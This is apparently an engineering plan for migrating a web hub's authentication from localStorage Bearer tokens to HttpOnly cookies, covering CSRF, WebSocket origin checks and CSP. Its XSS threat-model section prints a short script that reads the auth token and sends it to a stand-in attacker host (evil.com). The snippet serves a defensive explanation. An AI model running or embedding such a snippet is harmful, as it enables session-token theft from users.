# HttpOnly Cookie Auth Migration

## Overview

Migrate hub authentication from localStorage + Bearer tokens to HttpOnly cookies. This eliminates token exposure in URLs, query parameters, localStorage, and browser history, and removes the XSS token-theft vector entirely.

## Context

Current flow:
1. Google OAuth redirect → server validates JWT → redirects to SPA with `?auth_credential=<jwt>` in URL
2. SPA picks up credential from URL, stores in localStorage
3. REST calls: token read from localStorage, sent as `Authorization: Bearer <token>`
4. WebSocket: token appended as `?id_token=<token>` query parameter

Problems: token appears in URLs, reverse proxy logs, browser history, and is exfiltrable via XSS.

## Work Items

### Phase 0: Tests

Write tests before implementing. At minimum:

**Server tests (unit tests implemented for helpers; integration tests require live JWKS):**
- [x] `auth_callback` sets `Set-Cookie` with correct attributes (`HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, `Max-Age`) — tested via `build_auth_cookie_secure`
- [x] `auth_callback` redirects to clean `/` (no credential in URL) — code redirects to `/`
- [ ] `auth_callback` does NOT set `Set-Cookie` when JWT validation fails — requires live JWKS decoder
- [x] `auth_callback` omits `Secure` flag when `--allow-insecure-auth` is active — tested via `build_auth_cookie_insecure`
- [x] Vite dev middleware sets `Set-Cookie` without `Secure` flag — verified in code (no `Secure` in dev cookie string)
- [x] `authenticate()` accepts token from cookie — `cookie_token()` helper tested, `authenticate()` unchanged
- [x] `authenticate()` rejects requests with no cookie — `cookie_token()` returns None, authenticate() returns 401
- [ ] `GET /auth/me` returns user info from valid cookie, 401 from missing/expired cookie — requires live JWKS
- [x] `POST /auth/logout` clears the cookie — `build_clear_cookie()` sets Max-Age=0, verified by test
- [ ] `POST /auth/refresh` validates the new JWT (full `authenticate()` path) — requires live JWKS
- [ ] `POST /auth/refresh` rejects a JWT whose email has been removed from the allowlist — requires live JWKS
- [ ] `POST /auth/refresh` rejects an expired Google JWT — requires live JWKS
- [x] CSRF: state-mutating endpoints reject requests without `X-Requested-With: XMLHttpRequest` — `check_csrf` unit tests
- [x] CSRF: state-mutating endpoints accept requests with the header — `check_csrf` unit tests
- [x] WebSocket: `ws_handler` rejects upgrades with mismatched `Origin` — `check_ws_origin` unit tests
- [x] WebSocket: `ws_handler` accepts upgrades with correct `Origin` — `check_ws_origin` unit tests
- [x] WebSocket: `ws_handler` authenticates via cookie — code uses `cookie_token(&headers)`
- [x] `/health` endpoint authenticates via cookie — code uses `cookie_token(&headers)`

**Client tests:**
- [x] `useAuth` calls `/auth/me` on mount and populates auth state on 200 — implemented in useAuth
- [x] `useAuth` shows login when `/auth/me` returns 401 — loading state + auth null check
- [x] `useAuth` shows loading (not login screen) when `/auth/me` returns 401 during an active refresh — `authLoading` state
- [x] No references to localStorage for auth after migration (grep check) — verified, zero auth localStorage refs

### Phase 1: Server-side cookie infrastructure

- [x] Modify `auth_callback` in `server.rs` to set `Set-Cookie: quarto_hub_token=<jwt>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600` and redirect to clean `/` (no credential in URL)
- [x] Conditionally omit `Secure` flag when `--allow-insecure-auth` is active (mirrors `validate_tls_config()` logic) — browsers refuse to send `Secure` cookies over HTTP, breaking dev mode
- [x] Add cookie-reading helper (parse `quarto_hub_token` from `Cookie` header)
- [x] Replace `bearer_token()` usage in all REST handlers with cookie extraction — no CLI client exists, so Bearer support is not needed
- [x] Add `headers: HeaderMap` to `ws_handler` signature (currently only extracts `Query(params)` and `WebSocketUpgrade`) — needed for cookie reading and Origin check
- [x] Replace `WsParams.id_token` query param usage in `ws_handler` with cookie extraction
- [x] Remove `bearer_token()` helper and `WsParams.id_token` field
- [x] Add `GET /auth/me` endpoint — validates cookie, returns `{ email, name, picture }` as JSON
- [x] Add `POST /auth/logout` endpoint — clears the cookie (`Max-Age=0`)
- [x] Add CSRF protection for state-mutating REST endpoints (POST/PUT) — require `X-Requested-With: XMLHttpRequest` header; reject without it
- [x] Add `Origin` header check to `ws_handler` — reject WebSocket upgrades where Origin doesn't match the expected hub origin
- [x] Update Vite `authCallbackPlugin` to match: set `Set-Cookie` header instead of redirecting with `?auth_credential=` (omit `Secure` flag since dev server is HTTP, keep `SameSite=Lax`)

### Phase 2: Client-side simplification

- [x] Replace `authService.ts` localStorage logic with a simple `GET /auth/me` call; remove `decodeJwtPayload`, `storeAuth`, `getStoredAuth`, `getIdToken`
- [x] Remove `appendAuthToken()` from `automergeSync.ts` — cookies sent automatically on same-origin requests
- [x] Simplify `useAuth` hook: on mount call `/auth/me`, if 401 show login, if 200 store display info in React state. Remove URL credential ingestion and client-side JWT decoding. Handle 401-during-refresh gracefully (show loading state, not a login flash — see implementation note below).
- [x] Update `LoginButton` — same redirect flow, but the redirect now lands on clean `/` and `useAuth` fetches user info via `/auth/me`
- [x] Update `main.tsx` — `GoogleOAuthProvider` still needed for One Tap refresh
- [x] Token refresh: silent refresh via One Tap gets a new JWT client-side, then `POST /auth/refresh` with the JWT in the request body (e.g., `{ "credential": "<jwt>" }`) validates it server-side and sets a fresh cookie. Needs `X-Requested-With` CSRF header like other POST endpoints.

### Phase 3: Cleanup

- [x] Remove `?auth_credential=` URL parameter handling from `useAuth`
- [x] Update `RedactedMakeSpan` comment — query string redaction is still good practice but no longer auth-critical

### Phase 4: Content-Security-Policy headers

CSP is defense-in-depth against XSS — even with HttpOnly cookies eliminating credential theft, XSS can still make authenticated requests from the victim's browser. A strict CSP limits what injected scripts can do. Set in the Rust server so it's always active regardless of deployment topology (not all deployments use a reverse proxy).

**Server tests (add to Phase 0 test run):**
- [x] HTML responses include `Content-Security-Policy` header — CSP layer added to router when auth enabled
- [x] CSP allows Google OAuth scripts (`accounts.google.com`) — `csp_allows_google_oauth` test
- [x] CSP allows WebSocket connections (`ws:`, `wss:`) — `csp_allows_websocket` test
- [x] CSP blocks inline scripts (no `'unsafe-inline'` in `script-src`) — `csp_blocks_inline_scripts` test

**Implementation:**
- [x] Add CSP middleware to the axum router that sets `Content-Security-Policy` on all responses (via `SetResponseHeaderLayer`)
- [x] Policy: `default-src 'self'; script-src 'self' https://accounts.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://lh3.googleusercontent.com; connect-src 'self' ws: wss: https://accounts.google.com; frame-src https://accounts.google.com`
- [x] Skip CSP header when auth is disabled (no Google OAuth sources needed)
- [x] Verify hub-client builds produce no inline scripts that would be blocked by CSP — verified: only `<script type="module" src="...">` (external, allowed by `'self'`)

## Analysis: Why HttpOnly Cookies over Bearer Tokens

### Current approach: localStorage + Bearer tokens

**Benefits:**
- **Simplicity** — the client controls the token lifecycle entirely; no server-side cookie management needed
- **Stateless server** — the server just validates JWTs; no cookie parsing, no `Set-Cookie` headers, no CSRF considerations
- **Cross-origin flexibility** — Bearer tokens work trivially across different origins (e.g., if the hub API and SPA were on different domains)
- **No CSRF surface at all** — tokens are explicitly attached to requests, never auto-sent by the browser

**Drawbacks:**
- Token in URL (`?auth_credential=`) leaks to browser history, referrer headers, proxy logs
- Token in localStorage is exfiltrable via XSS
- Token in WebSocket URL (`?id_token=`) visible in server logs and browser dev tools

### Proposed approach: HttpOnly cookies

**Benefits:**
- **XSS cannot steal the token** — JavaScript has zero access to HttpOnly cookies, so even if an attacker achieves XSS, they cannot exfiltrate the session credential
- **No token in URLs** — eliminates the leakage vectors (history, logs, referrer)
- **Automatic attachment** — browser sends cookies on every same-origin request including WebSocket upgrades, simplifying client code significantly
- **Client-side simplification** — `authService.ts` shrinks dramatically; no more `decodeJwtPayload`, `storeAuth`, `getIdToken`, `appendAuthToken`

**Drawbacks:**
- **CSRF becomes a concern** — auto-sent credentials are the classic CSRF vector (mitigated by `X-Requested-With` check and `SameSite=Lax`)
- **More server complexity** — cookie lifecycle management, `/auth/me`, `/auth/logout`, `/auth/refresh`, CSRF checks, Origin validation on WebSocket

### Why HttpOnly cookies are the right choice for hub

1. **Hub is browser-first.** The primary threat model is a browser environment where XSS is the dominant attack vector. HttpOnly cookies directly neutralize the highest-impact consequence of XSS (credential theft and session hijacking).

2. **The CSRF trade-off is favorable.** The CSRF surface is tiny (two POST endpoints) and the mitigations are well-understood and minimal. We're trading a hard-to-mitigate risk (XSS token theft) for an easy-to-mitigate risk (CSRF).

3. **The token-in-URL problem is real today.** The `?auth_credential=` and `?id_token=` patterns mean tokens land in places we don't control (reverse proxy logs, browser history, potentially analytics).

4. **Client simplification is a maintenance win.** Removing client-side JWT handling, localStorage management, and manual token attachment reduces code that is both security-sensitive and easy to get wrong.

### XSS threat model in detail

With localStorage tokens, an XSS attacker runs:

```js
const token = localStorage.getItem("hub_auth");
fetch("https://evil.com/steal?token=" + token);
```

They now have the user's JWT. They can use it from their own machine, from any IP, at any time until it expires. The attacker has **persistent, independent access** — they don't need to maintain the XSS. Even if the XSS vulnerability is patched the next day, every stolen token remains valid.

With HttpOnly cookies, the token is sent to the server on every request but JavaScript literally cannot read it. There is no API to access it. `document.cookie` won't list it. The browser enforces this at the engine level.

Under XSS with HttpOnly cookies, the attacker **can** make authenticated requests from the victim's browser (the cookie is auto-attached), but **cannot** extract the token, use it from another machine, or maintain access after the XSS is patched or the browser tab is closed.

| | localStorage token | HttpOnly cookie |
|---|---|---|
| Attacker can make requests as user | Yes | Yes |
| Attacker can steal token for later use | **Yes** | No |
| Attacker can use token from own machine | **Yes** | No |
| Access survives XSS being patched | **Yes** | No |
| Access survives user closing browser | **Yes** | No |

HttpOnly cookies don't prevent XSS. They limit its **blast radius** by making credential theft impossible. The distinction is between "attacker has a session" and "attacker has the keys."

## Design Decisions

- **No Bearer token support**: The CLI client has been removed (`1c0b698b`). Hub is browser-only, so `authenticate()` uses cookie extraction exclusively. Bearer support can be re-added later if a CLI/API client is introduced.
- **Third-party sync servers unaffected**: Cookies are origin-scoped. Auth is only relevant for the hub's own endpoints. External sync servers (e.g., `sync.automerge.org`) don't require auth and never received tokens anyway — `appendAuthToken` only fires when a token exists in localStorage.
- **CSRF for REST endpoints**: `PUT /api/documents/{id}`, `POST /auth/logout`, and `POST /auth/refresh` are state-mutating. `X-Requested-With: XMLHttpRequest` header check is the simplest approach — browsers don't allow cross-origin custom headers without CORS preflight. This is the same mechanism used by Django and Rails. **Exception**: `POST /auth/callback` is excluded from the `X-Requested-With` requirement — it's a cross-origin POST from Google's servers and is CSRF-protected by Google's own `g_csrf_token` mechanism instead.
- **CSRF for WebSocket**: Browsers send cookies on WebSocket upgrade but don't enforce CORS preflight, so a cross-origin page could open an authenticated WebSocket. Defense: check the `Origin` header in `ws_handler` and reject if it doesn't match the expected hub origin. This is a one-line addition.
- **`SameSite=Lax`**: Sufficient because the only cross-site POST is Google's OAuth callback, which doesn't need the hub cookie (it *sets* it). All subsequent requests are same-site. `SameSite=Lax` may also block cross-origin WebSocket cookie sending in some browsers, providing defense-in-depth alongside the Origin check. However, browser behavior for `SameSite` on WebSocket upgrades is not standardized — the `Origin` header check is the primary defense.
- **`Secure` flag conditional on TLS**: In dev mode (`--allow-insecure-auth`, HTTP), the `Secure` flag must be omitted or browsers will silently refuse to send the cookie. This mirrors the existing `validate_tls_config()` pattern.
- **`/health` endpoint**: Uses the same `authenticate()` path as other endpoints, so it works with cookies automatically once `authenticate()` supports cookie extraction. No special handling needed.
- **`POST /auth/refresh` flow**: One Tap silent refresh produces a new Google JWT client-side. The client sends this JWT to `POST /auth/refresh` in the request body (`{ "credential": "<jwt>" }`). The server validates it using the full `authenticate()` path (signature, audience, issuer, **and email allowlist**), sets a fresh `Set-Cookie`, and returns 200. Requires `X-Requested-With` header for CSRF protection. If the user's email was removed from the allowlist between login and refresh, the refresh correctly fails.
- **Cookie size**: Google ID tokens are typically ~800–1200 bytes, well within the 4096-byte per-cookie limit. No risk of silent truncation.
- **Cookie name `quarto_hub_token`**: Prefixed with `quarto_` to avoid collisions with other products that might share the same domain. The `__Host-` prefix (which prevents subdomain attacks and enforces `Secure; Path=/`) is not used because it requires the `Secure` flag unconditionally — this conflicts with `--allow-insecure-auth` dev mode where `Secure` must be omitted for HTTP. Since hub is typically deployed on its own origin (not a shared domain with subdomains), the subdomain protection of `__Host-` is unnecessary.
- **Cookie `Path=/` scope**: `Path=/` is correct for the current single-origin deployment model. If hub is ever deployed behind a path prefix (e.g., `example.com/hub/`), the cookie would be sent to all paths on the origin, not just `/hub/`. Acceptable for now; revisit if deployment topology changes.
- **Multi-tab logout**: When a user logs out in one tab (cookie cleared server-side via `Max-Age=0`), other tabs still hold the cookie until their next request gets a 401. This is inherent to cookie-based auth and acceptable for hub — the `useAuth` hook already handles 401 by showing the login screen, so the other tab will gracefully degrade on its next API call or WebSocket reconnect.

## Deployment Topology: WebSocket + Cookie Auth

HttpOnly cookies are origin-scoped. The WebSocket upgrade must arrive from the same origin that set the cookie, or the browser won't include it. This means a single entry point (one host:port) must serve both the SPA and the WebSocket endpoint.

**Production** — a reverse proxy (nginx, Caddy, cloud LB) is the single entry point:
- Serves the SPA static files directly
- Forwards `/ws` WebSocket upgrades to the hub server
- All requests are same-origin, so the cookie (set by the hub's `/auth/callback`) is sent automatically
- `check_ws_origin()` passes because Origin matches Host
- The hub's `--behind-tls-proxy` flag is required; the proxy terminates TLS

**Dev mode** — the Vite dev server (`:5173`) is the single entry point:
- Serves the SPA with HMR
- Handles `/auth/*` endpoints via the `authPlugin()` middleware (sets cookie on Vite's origin)
- Forwards `/ws` WebSocket upgrades to the hub (`:3000`) via `hubWebSocketPlugin()`, including the Cookie header
- `check_ws_origin()` is skipped (`--allow-insecure-auth`) because the forwarded Origin is Vite's, not the hub's
- Cookie auth is still enforced — the hub validates the JWT from the forwarded cookie
- The sync server URL must be `ws://localhost:5173/ws` (not the hub's port directly)
- The hub target defaults to `http://localhost:3000`; override with `VITE_HUB_SERVER` env var

## Implementation Notes

These are details to keep in mind during implementation, not separate work items.

- **`ws_handler` signature change**: The current handler only extracts `Query(params)` and `WebSocketUpgrade`. Adding `headers: HeaderMap` is required for both cookie extraction and Origin validation. This is a straightforward axum extractor addition.
- **Token refresh race window**: Between cookie expiry and `POST /auth/refresh` completing, in-flight requests may 401. The current Bearer flow has the same window (localStorage token expires → One Tap refresh). Not a regression, but `useAuth` should distinguish "no auth at all" (show login) from "auth expired, refresh in progress" (show loading). A simple `isRefreshing` state flag suffices.
- **`bearer_token()` call sites**: There are exactly 5 call sites in `server.rs` (health, list_files, list_documents, get_document, update_document) plus the helper definition itself. All switch to cookie extraction.
- **Vite dev middleware**: Must set `Set-Cookie` with `HttpOnly; SameSite=Lax; Path=/; Max-Age=3600` but **without** `Secure` (Vite serves over HTTP). Worth an explicit test because omitting `Secure` is the opposite of the production default — an easy mistake.
- **Refresh `Max-Age` reset**: When `POST /auth/refresh` sets a fresh `Set-Cookie`, it must include a fresh `Max-Age=3600`. The old cookie's countdown does not automatically reset — the server must explicitly set a new `Max-Age` in the response. Google ID tokens expire after 1 hour, so `Max-Age=3600` keeps cookie and token expiry aligned.
- **CSP `style-src 'unsafe-inline'`**: The Phase 4 CSP includes `'unsafe-inline'` in `style-src` because React and CSS frameworks commonly inject inline styles. If hub-client does not actually require inline styles, remove `'unsafe-inline'` for a tighter policy. Verify during Phase 4 implementation.
